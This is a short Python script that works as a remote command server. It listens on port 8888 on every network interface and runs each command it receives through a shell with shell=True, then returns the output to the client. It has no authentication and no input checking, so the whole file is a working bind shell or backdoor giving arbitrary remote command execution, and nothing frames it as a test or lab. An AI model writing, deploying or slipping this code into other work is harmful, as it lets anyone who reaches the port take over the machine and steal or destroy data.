import subprocess
import socket

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('0.0.0.0', 8888)  # Replace with your desired IP address and port
server_socket.bind(server_address)
server_socket.listen(1)

print("Server started. Listening for incoming connections...")

while True:
    client_socket, client_address = server_socket.accept()
    print("Received connection from:", client_address)

    command = client_socket.recv(1024).decode().strip()

    if command == 'exit':
        print("Closing connection with:", client_address)
        client_socket.close()
        break
    else:
        result = execute_command(command)
        client_socket.sendall(result.encode())

    client_socket.close()

server_socket.close()
